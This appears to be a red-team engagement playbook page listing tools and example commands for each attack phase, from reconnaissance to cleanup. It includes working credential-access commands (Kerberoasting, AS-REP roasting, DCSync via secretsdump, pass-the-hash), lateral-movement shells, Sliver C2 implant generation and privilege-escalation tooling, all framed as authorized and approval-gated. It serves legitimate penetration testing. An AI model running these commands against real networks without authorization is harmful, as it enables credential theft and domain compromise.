# 12 — Per-Phase Tools & Commands Reference

Concrete tools and **example commands** for each phase of the lifecycle (`docs/02`).
Commands are standard, authorized **enumeration / validation** invocations — run them only
through the Global Safety Controller (`docs/01`). Placeholders: `$T`=target, `$D`=domain,
`$DC`=domain controller, `$U`=user, `$P`=password, `$H`=hash, `$CIDR`=in-scope range,
`$URL`=target URL. Sensitive actions (dumping, DCSync, PtH) stay approval-gated; the
example shows the invocation shape, not a mass-abuse recipe.

---

## Phase 1 — Recon (TA0043)
**Tools**: subfinder, amass, dnsx, httpx, whois, dig, shodan/censys, crt.sh, cloud_enum, trufflehog.
```bash
subfinder -d $D -silent | tee subs.txt
amass enum -passive -d $D -o amass.txt
dnsx -l subs.txt -resp -a -o resolved.txt          # resolve to IPs
whois $D ; dig +short $D any ; dig txt $D           # registration / SPF / DMARC
curl -s "https://crt.sh/?q=%25.$D&output=json" | jq -r '.[].name_value' | sort -u
httpx -l resolved.txt -title -tech-detect -status-code -o httpx.txt
cloud_enum -k $D                                    # cloud footprint (read-only OSINT)
# OSINT secret exposure (authorized repos only):
trufflehog github --org=<authorized-org> --only-verified
```

## Phase 2 — Attack-Surface Mapping (TA0007/T1595)
**Tools**: naabu, RustScan, nmap, masscan (approval), httpx, nuclei, WhatWeb.
```bash
naabu -list resolved.txt -top-ports 1000 -rate 500 -o ports.txt     # fast TCP sweep
nmap -sV -sC -Pn -p$(cut -d: -f2 ports.txt | paste -sd,) -oA nmap_$T $T
# web-specific:
httpx -l resolved.txt -td -title -sc -json -o web.json
nuclei -l web.json -severity medium,high,critical -o nuclei.txt       # CANDIDATES only
whatweb $URL
```
Interpret: nuclei output is a *candidate* list → manual-validate before recording.

## Phase 3 — Initial Access (TA0001)
**Tools**: NetExec, Burp Suite, ffuf, evil-winrm, ssh, GoPhish (approved), hydra (approval + lockout-guard).
```bash
# valid-account validation (single attempt per account — NO spraying):
netexec smb $T -u $U -p $P                          # never spray across accounts
netexec winrm $T -u $U -p $P
# content discovery for web entry:
ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,403
# exposed mgmt UI default-cred single check: do manually in browser / one netexec call
```

## Phase 4 — Foothold / situational awareness
**Tools**: native OS (LOLBins) first.
```bash
# Windows:
whoami /all & hostname & ipconfig /all & systeminfo
# Linux:
id; hostname; uname -a; cat /etc/os-release; ip a; ss -tulpn
```

## Phase 5 — C2 (optional, emulation)
**Tools**: Caldera, Sliver, Mythic, Havoc. (Full lifecycle in `docs/08`.)
```bash
# Sliver example (operator host):
sliver > https -L <redirector> ; sliver > generate --http <redirector> --save /tmp/impl
# Caldera: deploy Sandcat one-liner from the UI to in-scope host only.
```

## Phase 6 — Discovery (TA0007)
**Tools**: native, NetExec, ldapsearch, SharpHound/bloodhound-python, BloodHound, PowerView.
```bash
# Windows native (quiet):
net user /domain & net group "Domain Admins" /domain & nltest /dclist:$D
# AD data collection (remote):
bloodhound-python -u $U -p $P -d $D -c All -ns $DC --zip
# or on-host: SharpHound.exe -c All
netexec smb $CIDR -u $U -p $P --shares               # share discovery across scope
ldapsearch -x -H ldap://$DC -D "$U@$D" -w $P -b "dc=${D//./,dc=}" "(objectClass=user)" sAMAccountName
```

## Phase 7 — Privilege Escalation (TA0004)
**Tools**: WinPEAS, PowerUp, Seatbelt (Win); linPEAS, pspy (Linux).
```bash
# Windows:
.\winPEASx64.exe quiet
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
whoami /priv                                          # look for SeImpersonate/SeBackup etc.
# Linux:
./linpeas.sh -a | tee linpeas.txt
sudo -l ; find / -perm -4000 -type f 2>/dev/null ; getcap -r / 2>/dev/null
```
Validate the least-risk, most-reversible candidate first (`docs/06`, `docs/21`).

## Phase 8 — Credential Access (TA0006, approval-gated)
**Tools**: Impacket (GetUserSPNs/GetNPUsers/secretsdump), hashcat, NetExec.
```bash
# Kerberoast (request → crack OFFLINE, low impact):
GetUserSPNs.py $D/$U:$P -dc-ip $DC -request -outputfile spns.hash
hashcat -m 13100 spns.hash wordlist.txt --quiet
# AS-REP roast:
GetNPUsers.py $D/ -usersfile users.txt -no-pass -dc-ip $DC -outputfile asrep.hash
hashcat -m 18200 asrep.hash wordlist.txt
# Dumping / DCSync (EXPLICIT APPROVAL — single test account, proof-of-capability, then STOP):
secretsdump.py $D/$U:$P@$DC -just-dc-user <test_account>
# Password policy FIRST (avoid lockouts):
netexec smb $DC -u $U -p $P --pass-pol
```

## Phase 9 — Lateral Movement (TA0008, no auto-spread)
**Tools**: NetExec, Impacket (wmiexec/psexec/smbexec/atexec), evil-winrm, ssh, xfreerdp.
```bash
# find where creds are admin, THEN move to one chosen host:
netexec smb $CIDR -u $U -p $P | grep "(Pwn3d!)"
evil-winrm -i $T -u $U -p $P                          # WinRM shell
wmiexec.py $D/$U:$P@$T                                # WMI exec
# Pass-the-Hash (APPROVAL): netexec smb $T -u $U -H $H
xfreerdp /u:$U /p:$P /v:$T /cert:ignore               # RDP
ssh $U@$T                                             # Linux
```

## Phase 10 — Objective Discovery (TA0007)
**Tools**: BloodHound (queries), NetExec share hunting, DNS/SPN enum.
```bash
# BloodHound Cypher (in UI): shortest path to Tier-0, DCSync principals, Kerberoastable.
setspn -Q */* | findstr /i "SQL BACKUP VEEAM"         # locate HVA service accounts
netexec smb $CIDR -u $U -p $P -M spider_plus          # hunt interesting shares
```

## Phase 11 — Controlled Objective Simulation (synthetic/canary only)
**Tools**: your own benign marker scripts; openssl for reversible demo encryption.
```bash
# reversible sandbox "ransomware" demo on a SYNTHETIC file only:
openssl enc -aes-256-cbc -salt -in canary.txt -out canary.enc -k <documented-key>
openssl enc -d -aes-256-cbc -in canary.enc -out canary.dec -k <documented-key>   # revert
# canary exfil marker (synthetic):
echo "REDTEAM-CANARY-<id>" > canary_$RANDOM.txt ; sha256sum canary_*.txt
```
STOP before real data / backups / environment-wide action (`docs/10`).

## Phase 12 — Detection Validation (purple)
**Tools**: Wazuh/Elastic/Splunk, EDR console, TheHive+Cortex.
```bash
# correlate each action's timestamp with SIEM; confirm rule fired. See docs/11.
# Wazuh quick query (example): search by agent + rule groups around action time.
```

## Phase 13 — Cleanup
**Tools**: native removal commands + your change log (`docs/23`).
```bash
# Windows examples: sc delete <svc> ; schtasks /delete /tn <task> /f ; remove dropped files
# Linux examples: crontab -r (only entries you added) ; systemctl disable <unit you created>
# C2: kill agents, tear down listeners/redirectors, revoke certs.
```

## Phase 14 — Reporting
**Tools**: report templates (`docs/99`), ATT&CK Navigator for the heatmap, evidence index.

---

### Quick phase→tool index
| Phase | Primary tools | Native/LOLBin |
|---|---|---|
| Recon | subfinder, amass, dnsx, httpx | whois, dig, nslookup |
| Surface map | naabu, nmap, nuclei | /dev/tcp, Test-NetConnection |
| Initial access | NetExec, Burp, ffuf | ssh, rdp client |
| Discovery | NetExec, BloodHound, ldapsearch | net, nltest, ss, id |
| PrivEsc | WinPEAS, PowerUp, linPEAS | whoami /priv, sudo -l, find |
| Cred access | Impacket, hashcat | — |
| Lateral | NetExec, Impacket, evil-winrm | WinRM, ssh, PsExec |
| Objective | BloodHound, setspn | — |
| Detection | Wazuh, EDR, TheHive | OS logs |
